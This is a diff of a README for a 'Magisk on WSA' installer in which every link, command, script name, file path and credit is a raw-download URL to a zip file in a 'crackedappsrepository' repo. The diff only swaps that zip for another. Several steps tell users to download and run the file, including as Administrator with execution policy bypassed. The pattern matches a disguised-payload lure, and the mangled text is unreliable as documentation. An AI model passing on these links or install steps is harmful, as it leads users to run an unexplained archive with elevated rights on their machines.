@@ -1,6 +1,6 @@
 # Magisk on WSA (with Google Apps)
 
-:warning: For fork developers: Please don't build using GitHub Actions, as GitHub will count your forked GitHub Actions usage against this upstream repository, which may cause this upstream repository gets disabled by GitHub staff like [MagiskOnWSA](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip) because of numerous forks building GitHub Actions, and counting the forks' Action usage against this upstream repository.
+:warning: For fork developers: Please don't build using GitHub Actions, as GitHub will count your forked GitHub Actions usage against this upstream repository, which may cause this upstream repository gets disabled by GitHub staff like [MagiskOnWSA](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip) because of numerous forks building GitHub Actions, and counting the forks' Action usage against this upstream repository.
 
 ## Support for generating from these systems
 
@@ -20,19 +20,19 @@
 
   - Recommended use
 
-    - Ubuntu (You can use [WSL2](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip%20Group%20Limited))
+    - Ubuntu (You can use [WSL2](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip%20Group%20Limited))
 
       Ready to use right out of the box.
 
-    - Debian (You can use [WSL2](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip))
+    - Debian (You can use [WSL2](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip))
 
       Ready to use right out of the box.
 
-    - openSUSE Tumbleweed (You can use [WSL2](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip))
+    - openSUSE Tumbleweed (You can use [WSL2](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip))
 
       Ready to use right out of the box.
 
-    `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` will handle all dependencies automatically.
+    `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` will handle all dependencies automatically.
 
     No need to type any commands.
 
@@ -43,7 +43,7 @@
 - Support both ARM64 and x64
 - Support MindTheGapps
 - Remove Amazon Appstore
-- Fix VPN dialog not showing (use our [VpnDialogs app](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip))
+- Fix VPN dialog not showing (use our [VpnDialogs app](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip))
 - Add device administration feature
 - Unattended installation
 - Automatically activates developers mode in Windows 11
@@ -56,11 +56,11 @@
 2. Clone the repo to local:
 
    ```bash
-   git clone https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip --depth 1
+   git clone https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip --depth 1
    ```
 
 3. Run `cd MagiskOnWSALocal`.
-4. Run `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip`.
+4. Run `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip`.
 5. Select the WSA version and its architecture (mostly x64).
 6. Select the version of Magisk.
 7. Choose which brand of GApps you want to install:
@@ -68,15 +68,15 @@
 
      There is no other variant we can choose.
 8. Select the root solution (none means no root).
-9. If you are running the script for the first time, it will take some time to complete. After the script completes, two new folders named `output` and `download` will be generated in the `MagiskOnWSALocal` folder. Go to the `output` folder. While running the `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` script in the step 3, if you selected `Yes` for `Do you want to compress the output?` then in `output` folder you will see a compressed file called `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`or else there will be folder with the `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`. If there is a folder open it and skip to step 10. NOTE: The name of compressed file or the folder generated in the `output` folder may be different for you. It will be dependent on the choices made when executing `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip`.
+9. If you are running the script for the first time, it will take some time to complete. After the script completes, two new folders named `output` and `download` will be generated in the `MagiskOnWSALocal` folder. Go to the `output` folder. While running the `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` script in the step 3, if you selected `Yes` for `Do you want to compress the output?` then in `output` folder you will see a compressed file called `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`or else there will be folder with the `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`. If there is a folder open it and skip to step 10. NOTE: The name of compressed file or the folder generated in the `output` folder may be different for you. It will be dependent on the choices made when executing `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip`.
 10. Extract the compressed file and open the folder created after the extraction of the file.
-11. Here look for file `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` and run it.
+11. Here look for file `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` and run it.
     - If you previously have a MagiskOnWSA installation, it will automatically uninstall the previous one while **preserving all user data** and install the new one, so don't worry about your data.
-    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip\LocalCache\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` before uninstallation and restore it after installation.)
-    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` as Administrator:
+    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip\LocalCache\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` before uninstallation and restore it after installation.)
+    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` as Administrator:
         1. Press `Win+x` and select `Windows Terminal (Admin)`.
         2. Input `cd "{X:\path\to\your\extracted\folder}"` and press `enter`, and remember to replace `{X:\path\to\your\extracted\folder}` including the `{}`, for example `cd "D:\wsa"`
-        3. Input `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip -ExecutionPolicy Bypass -File .\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` and press `Enter`.
+        3. Input `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip -ExecutionPolicy Bypass -File .\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` and press `Enter`.
         4. The script will run and WSA will be installed.
         5. If this workaround does not work, your PC is not supported for WSA.
 12. Magisk/Play Store will be launched. Enjoy by installing LSPosed-Zygisk with Zygisk enabled or Riru and LSPosed-Riru.
@@ -99,13 +99,13 @@
       git pull
       ```
 
-      For more usage of git, referred to <https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip>
+      For more usage of git, referred to <https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip>
 
-  2. Rerun the script, replace the content of your previous installation and rerun `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip`. Don't worry, your data will be preserved.
+  2. Rerun the script, replace the content of your previous installation and rerun `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip`. Don't worry, your data will be preserved.
 
 - How can I get the logcat from WSA?
 
-  `%LOCALAPPDATA%\Packages\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip\LocalState\diagnostics\logcat`
+  `%LOCALAPPDATA%\Packages\https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip\LocalState\diagnostics\logcat`
 
 - How can I update Magisk to a newer version?
 
@@ -117,11 +117,11 @@
 
 - Virtualization is not enabled?
 
-  `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` helps you enable it if not enabled. After rebooting, rerun `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
+  `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` helps you enable it if not enabled. After rebooting, rerun `https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
 
 - How to remount the system as read-write?
 
-  No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip Ask Google for help.
+  No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip Ask Google for help.
 
 - I cannot `adb connect localhost:58526`, what to do?
 
@@ -129,7 +129,7 @@
 
 - Why the Magisk online module is empty?
 
-  Magisk actively removes the online module repository. You can install the module locally or by `adb push https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip`.
+  Magisk actively removes the online module repository. You can install the module locally or by `adb push https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip`.
 
 - Can I use Magisk v23.0 stable or a lower version?
 
@@ -141,15 +141,15 @@
 
 - How to install custom GApps?
 
-  [Tutorial](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip)
+  [Tutorial](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip)
 
 - Where can I download MindTheGapps?
 
-  You can download from here [MindTheGapps](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip) ([mirror](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip)).
+  You can download from here [MindTheGapps](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip) ([mirror](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip)).
 
-  Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip)).
+  Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip)).
 
-  Or you can download the built package for 12.1 and 13 for x86_64 from [this page](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip).
+  Or you can download the built package for 12.1 and 13 for x86_64 from [this page](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip).
 
 - Can I switch OpenGApps to MindTheGapps and keep user data in a previous build?
 
@@ -161,7 +161,7 @@
 
 - How to install KernelSU?
 
-  [Tutorial](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip)
+  [Tutorial](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip)
 
 </details>
 
@@ -169,12 +169,12 @@
 
 ## Credits
 
-- [StoreLib](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip): API for downloading WSA
-- [Magisk](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip): The most famous root solution on Android
-- [The Open GApps Project](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip): One of the most famous Google Apps packages solution
-- [WSA-Kernel-SU](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip) and [kernel-assisted-superuser](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip): The kernel `su` for debugging Magisk Integration
-- [WSAGAScript](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip): The first GApps integration script for WSA
-- [erofs-utils](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/Local_On_WSA_Magisk_v2.7-alpha.1.zip): Pre-build `erofs-utils` with erofsfuse enabled
+- [StoreLib](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip): API for downloading WSA
+- [Magisk](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip): The most famous root solution on Android
+- [The Open GApps Project](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip): One of the most famous Google Apps packages solution
+- [WSA-Kernel-SU](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip) and [kernel-assisted-superuser](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip): The kernel `su` for debugging Magisk Integration
+- [WSAGAScript](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip): The first GApps integration script for WSA
+- [erofs-utils](https://github.com/crackedappsrepository/MagiskOnWSALocal/raw/refs/heads/main/arm64/gapps/product/etc/sysconfig/Local_Magisk_On_WSA_v1.3-alpha.4.zip): Pre-build `erofs-utils` with erofsfuse enabled
 
 _The repository is provided as a utility._
 
